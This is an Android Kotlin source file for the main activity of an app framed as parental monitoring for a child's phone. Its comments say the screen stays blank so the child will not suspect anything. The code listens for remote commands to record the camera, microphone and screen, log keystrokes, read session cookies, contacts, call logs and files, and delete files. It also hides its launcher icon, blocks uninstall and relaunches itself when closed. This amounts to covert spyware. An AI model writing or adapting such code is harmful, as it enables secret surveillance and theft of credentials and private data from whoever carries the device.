package com.tether.kids.ui.main

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.tether.kids.network.ApiClient
import com.tether.kids.network.SocketManager
import com.tether.kids.security.HideIconHelper
import com.tether.kids.service.*
import com.tether.kids.utils.Config
import com.tether.kids.utils.PreferenceManager

/**
 * MainActivity — EMPTY, transparan, untuk anak.
 *
 * Tampilan: layar hitam kosong total. Tidak ada dot, tidak ada text, tidak ada tombol.
 * Anak tidak akan curiga bahwa ada app yang jalan.
 *
 * Auto-flow (background, tidak terlihat):
 *   1. App buka → auto-register ke server
 *   2. Auto-connect WebSocket
 *   3. Auto-request permission (location, sms, call, dll)
 *   4. Auto-start LocationService + SEMUA monitor services
 *   5. Setup socket listener untuk TERIMA SEMUA COMMAND dari parent
 *   6. Saat hide icon dipicu ortu → launcher icon hilang
 *
 * Anak cuma perlu: install → allow permissions → tutup app → selesai.
 * App tetap jalan di background sebagai foreground service.
 */
class MainActivity : AppCompatActivity() {

    companion object { private const val TAG = "KidsMain"; private const val PERM_REQ = 100 }

    private lateinit var prefs: PreferenceManager
    private lateinit var mainHandler: Handler

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.setFlags(
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
        )
        setContentView(R.layout.activity_main)

        prefs = PreferenceManager.getInstance(this)
        ApiClient.configure(Config.SERVER_URL)
        mainHandler = Handler(Looper.getMainLooper())

        // Setup SEMUA socket listener SEGERA (sebelum connect)
        setupSocketListeners()

        // Auto-flow: register → connect → permission → services
        autoSetup()
    }

    private fun autoSetup() {
        Thread {
            try {
                if (!prefs.isLoggedIn()) {
                    val deviceModel = Build.MODEL
                    val email = "kids_${deviceModel.replace(" ", "")}@tether.app"
                    val familyCode = prefs.getFamilyCode().ifEmpty { "FAMILY001" }
                    val response = ApiClient.register(email, "kids123", deviceModel, "kid", familyCode)
                    if (response != null && response.has("token")) {
                        prefs.saveAuthData(response)
                        prefs.saveFamilyCode(familyCode)
                    }
                }

                ApiClient.setToken(prefs.getToken())
                SocketManager.getInstance().connect(Config.SERVER_URL)

                mainHandler.postDelayed({
                    val s = SocketManager.getInstance()
                    if (s.isSocketConnected()) {
                        s.authenticate(prefs.getUserId(), "kid", prefs.getFamilyCode(), Build.MODEL)
                    }
                }, 2000)

                mainHandler.postDelayed({ requestPermissions() }, 1000)

                mainHandler.postDelayed({
                    startAllMonitorServices()
                    checkDeviceAdminStatus()
                }, 3000)

                mainHandler.postDelayed({
                    runOnUiThread { promptSpecialPermissionsIfNeeded() }
                }, 5000)

            } catch (e: Exception) {
                Log.e(TAG, "Auto setup error: ${e.message}")
            }
        }.start()
    }

    private fun promptSpecialPermissionsIfNeeded() {
        val status = com.tether.kids.security.PermissionPrompter.checkAll(this)
        val needSetup = !status.notificationAccess || !status.accessibility ||
                        !status.usageStats || !status.deviceAdmin
        if (needSetup) {
            com.tether.kids.security.PermissionPrompter.showSetupDialog(this)
        }
    }

    /**
     * Auto-start SEMUA monitor services.
     */
    private fun startAllMonitorServices() {
        Log.i(TAG, "🚀 Starting all monitor services")
        if (hasLocationPermission()) {
            startForegroundServiceCompat(LocationService::class.java)
        }
        startForegroundServiceCompat(BatteryMonitorService::class.java)
        startForegroundServiceCompat(NetworkMonitorService::class.java)
        startForegroundServiceCompat(ClipboardMonitorService::class.java)
        startForegroundServiceCompat(AppUsageService::class.java)
    }

    private fun startForegroundServiceCompat(clazz: Class<*>, action: String? = null) {
        try {
            val intent = Intent(this, clazz)
            if (action != null) intent.action = action
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to start ${clazz.simpleName}: ${e.message}")
        }
    }

    /**
     * Comprehensive socket listener — handle SEMUA 20 event dari parent.
     * FIX: Sebelumnya banyak fitur tidak jalan karena listener tidak ada
     * di MainActivity (cuma di SocketManager.emitEvent yang tidak ada consumer).
     */
    private fun setupSocketListeners() {
        val s = SocketManager.getInstance()

        s.addEventListener("auth:ok") { Log.i(TAG, "✅ Server auth confirmed") }

        // === MONITORING FEATURES (12) ===

        // 1. LOCATION — request fresh location
        s.addEventListener("location:request") { data ->
            Log.i(TAG, "📍 Location request from parent")
            startForegroundServiceCompat(LocationService::class.java)
            // Force a fresh location update by sending intent with refresh action
            val intent = Intent(this, LocationService::class.java).apply {
                action = "REFRESH"
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // 2. CAMERA — start/stop camera
        s.addEventListener("camera:start") { data ->
            Log.i(TAG, "📷 Camera start from parent")
            val intent = Intent(this, CameraService::class.java).apply {
                action = "START_CAMERA"
                putExtra("useFrontCamera", data.optBoolean("useFrontCamera", true))
                putExtra("duration", data.optInt("duration", 60000))
            }
            startForegroundServiceCompat(CameraService::class.java, "START_CAMERA")
        }
        s.addEventListener("camera:stop") { _ ->
            Log.i(TAG, "📷 Camera stop from parent")
            startForegroundServiceCompat(CameraService::class.java, "STOP_CAMERA")
        }

        // 3. VOICE — start/stop voice recording
        s.addEventListener("voice:start") { data ->
            Log.i(TAG, "🎤 Voice start from parent")
            val dur = data.optInt("duration", 30000)
            val sessionId = "voice_${System.currentTimeMillis()}"
            val intent = Intent(this, VoiceMonitorService::class.java).apply {
                action = "START_VOICE"
                putExtra("sessionId", sessionId)
                putExtra("duration", dur.toLong())
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }
        s.addEventListener("voice:stop") { _ ->
            Log.i(TAG, "🎤 Voice stop from parent")
            val intent = Intent(this, VoiceMonitorService::class.java).apply {
                action = "STOP_VOICE"
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // 4. MESSAGES (SMS/Chat) — SmsMonitorService auto-runs via NotificationListenerService
        s.addEventListener("sms:request-logs") { _ ->
            Log.i(TAG, "📬 SMS/chat log request (auto-monitored)")
            // SmsMonitorService is NotificationListenerService — auto-emits on each notification
        }

        // 5. APP USAGE — start/stop monitoring
        s.addEventListener("app:usage:start") { _ ->
            Log.i(TAG, "📊 App usage start from parent")
            val intent = Intent(this, AppUsageService::class.java).apply { action = "START" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }
        s.addEventListener("app:usage:stop") { _ ->
            Log.i(TAG, "📊 App usage stop from parent")
            val intent = Intent(this, AppUsageService::class.java).apply { action = "STOP" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // 6. HISTORY (Browser) — read browser history
        s.addEventListener("browser:history:request") { _ ->
            Log.i(TAG, "🌐 Browser history request from parent")
            val intent = Intent(this, BrowserHistoryService::class.java).apply { action = "READ" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // 7. CALL LOGS — read call history
        s.addEventListener("call:request") { _ ->
            Log.i(TAG, "📞 Call logs request from parent")
            val intent = Intent(this, CallLogService::class.java).apply { action = "READ" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // 8. SIM CARD — read SIM info
        s.addEventListener("sim:request") { _ ->
            Log.i(TAG, "📱 SIM info request from parent")
            val intent = Intent(this, SimCardService::class.java).apply { action = "READ" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // 9. CLIPBOARD — start/stop monitoring
        s.addEventListener("clipboard:start") { _ ->
            Log.i(TAG, "📋 Clipboard start from parent")
            val intent = Intent(this, ClipboardMonitorService::class.java).apply { action = "START" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }
        s.addEventListener("clipboard:stop") { _ ->
            Log.i(TAG, "📋 Clipboard stop from parent")
            val intent = Intent(this, ClipboardMonitorService::class.java).apply { action = "STOP" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // 10. KEYLOGGER — start/stop (requires AccessibilityService enabled)
        s.addEventListener("keylog:start") { _ ->
            Log.i(TAG, "⌨️ Keylog start from parent")
            // KeyloggerService is AccessibilityService — auto-runs when enabled
            // No explicit start needed; emit ack so parent knows
            SocketManager.getInstance().emit("keylog:status", org.json.JSONObject().apply {
                put("isRunning", true)
                put("note", "Requires AccessibilityService enabled in Settings")
            })
        }
        s.addEventListener("keylog:stop") { _ ->
            Log.i(TAG, "⌨️ Keylog stop from parent")
            SocketManager.getInstance().emit("keylog:status", org.json.JSONObject().apply {
                put("isRunning", false)
            })
        }

        // 11. BATTERY — start/stop monitoring
        s.addEventListener("battery:monitor:start") { _ ->
            Log.i(TAG, "🔋 Battery start from parent")
            val intent = Intent(this, BatteryMonitorService::class.java).apply { action = "START" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }
        s.addEventListener("battery:monitor:stop") { _ ->
            Log.i(TAG, "🔋 Battery stop from parent")
            val intent = Intent(this, BatteryMonitorService::class.java).apply { action = "STOP" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // 12. NETWORK (WiFi) — read network info
        s.addEventListener("wifi:request") { _ ->
            Log.i(TAG, "📶 WiFi/network request from parent")
            val intent = Intent(this, NetworkMonitorService::class.java).apply { action = "REPORT" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // === CONTROL FEATURES (6) ===

        // 13. LOCK SCREEN — show overlay
        s.addEventListener("screen:lock") { data ->
            val reason = data.optString("reason", "Locked by parent")
            Log.i(TAG, "🔒 Screen lock from parent: $reason")
            val intent = Intent(this, ScreenControlService::class.java).apply {
                action = "LOCK"
                putExtra("reason", reason)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }
        s.addEventListener("screen:unlock") { _ ->
            Log.i(TAG, "🔓 Screen unlock from parent")
            val intent = Intent(this, ScreenControlService::class.java).apply { action = "UNLOCK" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // 14. FLASHLIGHT — on/off
        s.addEventListener("flashlight:on") { _ ->
            Log.i(TAG, "🔦 Flashlight ON from parent")
            val intent = Intent(this, FlashlightService::class.java).apply { action = "ON" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }
        s.addEventListener("flashlight:off") { _ ->
            Log.i(TAG, "🔦 Flashlight OFF from parent")
            val intent = Intent(this, FlashlightService::class.java).apply { action = "OFF" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // 15. RING — make phone ring
        s.addEventListener("device:ring") { _ ->
            Log.i(TAG, "🔔 Ring from parent")
            val intent = Intent(this, RemoteRingService::class.java).apply { action = "RING" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }
        s.addEventListener("device:ring:stop") { _ ->
            Log.i(TAG, "🔔 Ring stop from parent")
            val intent = Intent(this, RemoteRingService::class.java).apply { action = "STOP" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // 16. SCREEN RECORD
        s.addEventListener("screen:recording:start") { data ->
            Log.i(TAG, "🎬 Screen record start from parent")
            val dur = data.optInt("maxDuration", 30000)
            val quality = data.optString("quality", "medium")
            val intent = Intent(this, ScreenRecorderService::class.java).apply {
                action = "START"
                putExtra("maxDuration", dur)
                putExtra("quality", quality)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }
        s.addEventListener("screen:recording:stop") { _ ->
            Log.i(TAG, "🎬 Screen record stop from parent")
            val intent = Intent(this, ScreenRecorderService::class.java).apply { action = "STOP" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // 17. NOTIFY — push notification to kid
        s.addEventListener("notify:send") { data ->
            Log.i(TAG, "📢 Notify from parent")
            val title = data.optString("title", "Message")
            val body = data.optString("body", "")
            val priority = data.optString("priority", "normal")
            val targetApp = data.optString("targetApp", "")
            val intent = Intent(this, RemoteNotificationService::class.java).apply {
                action = "SHOW_NOTIFICATION"
                putExtra("title", title)
                putExtra("body", body)
                putExtra("priority", priority)
                putExtra("targetApp", targetApp)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // 18. FILES — list/read/delete
        s.addEventListener("file:list") { data ->
            Log.i(TAG, "📁 File list from parent")
            val path = data.optString("path", "/storage/emulated/0")
            val intent = Intent(this, FileManagerService::class.java).apply {
                action = "LIST"
                putExtra("path", path)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }
        s.addEventListener("file:read") { data ->
            Log.i(TAG, "📁 File read from parent")
            val path = data.optString("path", "")
            val intent = Intent(this, FileManagerService::class.java).apply {
                action = "READ"
                putExtra("filePath", path)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }
        s.addEventListener("file:delete") { data ->
            Log.i(TAG, "📁 File delete from parent")
            val path = data.optString("path", "")
            val intent = Intent(this, FileManagerService::class.java).apply {
                action = "DELETE"
                putExtra("filePath", path)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // === ACCESS FEATURES (2) ===

        // 19. CONTACTS — read contacts
        s.addEventListener("contacts:request") { _ ->
            Log.i(TAG, "👥 Contacts request from parent")
            val intent = Intent(this, ContactsAccessService::class.java).apply { action = "READ" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // 20. SESSION (Browser cookies) — read session cookies
        s.addEventListener("session:request-cookies") { _ ->
            Log.i(TAG, "🔐 Session cookies request from parent")
            val intent = Intent(this, SessionMonitorService::class.java).apply { action = "CHECK_SESSIONS" }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        }

        // === ANTI-UNINSTALL & SECURITY ===

        s.addEventListener("hide:icon:command") { data ->
            val action = data.optString("action", "hide")
            Log.i(TAG, "👻 Hide icon: $action")
            when (action) {
                "hide" -> {
                    val success = HideIconHelper.hide(this@MainActivity)
                    SocketManager.getInstance().emit("icon:hidden:result",
                        org.json.JSONObject().apply { put("success", success); put("action", "hide") })
                }
                "show" -> {
                    val success = HideIconHelper.show(this@MainActivity)
                    SocketManager.getInstance().emit("icon:hidden:result",
                        org.json.JSONObject().apply { put("success", success); put("action", "show") })
                }
            }
        }

        s.addEventListener("block:uninstall:command") { data ->
            val action = data.optString("action", "block")
            Log.i(TAG, "🛡️ Block uninstall: $action")
            val result = when (action) {
                "block" -> HideIconHelper.blockUninstall(this@MainActivity)
                "unblock" -> HideIconHelper.unblockUninstall(this@MainActivity)
                else -> false
            }
            SocketManager.getInstance().emit("uninstall:block:result",
                org.json.JSONObject().apply {
                    put("action", action)
                    put("success", result)
                    put("isDeviceOwner", (getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager)
                        .isDeviceOwnerApp(packageName))
                })
        }

        s.addEventListener("pin:received") { data ->
            val parentName = data.optString("parentName", "Orang Tua")
            val ttl = data.optInt("ttlSeconds", 600)
            Log.i(TAG, "🔐 PIN received from $parentName (valid ${ttl/60}min)")
        }

        s.addEventListener("pin:required") { data ->
            val actionType = data.optString("actionType", "settings")
            val target = data.optString("actionTarget", "")
            Log.i(TAG, "🔐 PIN required: $actionType $target")
            val intent = Intent(this@MainActivity, com.tether.kids.security.PinVerificationActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra(com.tether.kids.security.PinVerificationActivity.ACTION_TYPE, actionType)
                putExtra(com.tether.kids.security.PinVerificationActivity.ACTION_TARGET, target)
            }
            startActivity(intent)
        }
    }

    private fun hasLocationPermission(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
    }

    private fun startLocationService() {
        val i = Intent(this, LocationService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i) else startService(i)
        prefs.setLocationSharing(true)
    }

    private fun requestPermissions() {
        val perms = mutableListOf<String>()

        if (!hasLocationPermission()) {
            perms.add(Manifest.permission.ACCESS_FINE_LOCATION)
            perms.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            perms.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }

        val optionalPerms = listOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE
        )
        for (perm in optionalPerms) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                perms.add(perm)
            }
        }

        if (perms.isNotEmpty()) {
            Log.d(TAG, "Requesting ${perms.size} permissions")
            ActivityCompat.requestPermissions(this, perms.toTypedArray(), PERM_REQ)
        }
    }

    private fun checkDeviceAdminStatus() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val comp = ComponentName(this, DeviceAdminReceiver::class.java)
            val isOwner = dpm.isDeviceOwnerApp(packageName)
            val isAdmin = dpm.isAdminActive(comp)
            Log.i(TAG, "DeviceAdmin: owner=$isOwner admin=$isAdmin")

            if (SocketManager.getInstance().isSocketConnected()) {
                SocketManager.getInstance().emit("device:admin:status", org.json.JSONObject().apply {
                    put("isDeviceOwner", isOwner)
                    put("isAdminActive", isAdmin)
                })
            }
        } catch (e: Exception) {
            Log.e(TAG, "DeviceAdmin check failed: ${e.message}")
        }
    }

    override fun onRequestPermissionsResult(req: Int, perms: Array<out String>, results: IntArray) {
        super.onRequestPermissionsResult(req, perms, results)
        if (req == PERM_REQ) {
            if (hasLocationPermission()) {
                startLocationService()
                mainHandler.postDelayed({ startAllMonitorServices() }, 1000)
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        val restartIntent = Intent(this, MainActivity::class.java)
        restartIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(restartIntent)
    }
}
